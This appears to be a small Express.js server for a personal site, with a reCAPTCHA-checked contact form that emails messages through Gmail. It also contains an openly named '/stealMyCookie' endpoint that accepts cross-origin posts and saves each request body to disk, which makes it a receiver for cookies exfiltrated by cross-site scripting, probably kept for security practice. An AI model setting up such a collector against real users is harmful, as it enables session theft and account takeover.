const express = require("express");
const path = require("path");
const app = express();
const nodemailer = require('nodemailer');
const bodyParser = require("body-parser");
const request = require("request");
const helmet = require("helmet")
const fs = require("fs");

app.use(express.urlencoded());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname + "/public")));
app.use(helmet())

const secret = process.env.captchaSecret;

app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname + "/public/index.html"));
});

app.post('/mailme', function (req, res) {

  
  // Verify URL

  
  const captcha_response = req.body['g-recaptcha-response']
  
  const verifyUrl = `https://google.com/recaptcha/api/siteverify?secret=${secret}&response=${captcha_response}&remoteip=${req.connection.remoteAddress}`;

  request(verifyUrl, (err, response, body) => {
    body = JSON.parse(body);
    console.log(body);

    // If Not Successful
    if(!body.success){
      res.sendStatus(500);
      return;
    }

    //If Successful
    emailMe({
      "from": req.body.contactEmail,
      "subject": req.body.contactSubject,
      "text": req.body.contactMessage,
      "name": req.body.contactName
    });
    res.sendStatus(200);
  });
  });

app.post("/stealMyCookie", function(req, res) {
  console.log(`\n------------------\nInvoked at ${new Date()}\n------------------\n`);
  console.log(req.body.toString());
  fs.writeFileSync(path.join(__dirname, "misc", (+ new Date()).toString()), JSON.stringify(req.body));
  res.append('Access-Control-Allow-Origin', ['*']);
  res.append('Access-Control-Allow-Methods', 'PUT');
  res.append('Access-Control-Allow-Headers', 'Content-Type');
  res.send("ok");
});

app.listen(3000, () => console.log("Example app listening on port 3000!"))

function emailMe(email_object){
    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.appMailer,
          pass: process.env.appMailerPW
        }
      });
      
      var mailOptions = {
        from: email_object.from,
        to: process.env.recipient,
        subject: email_object.subject,
        text: email_object.text + "\nfrom: " + email_object.from + "\nname: " + email_object.name
      };
      
      transporter.sendMail(mailOptions, function(error, info){
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
}
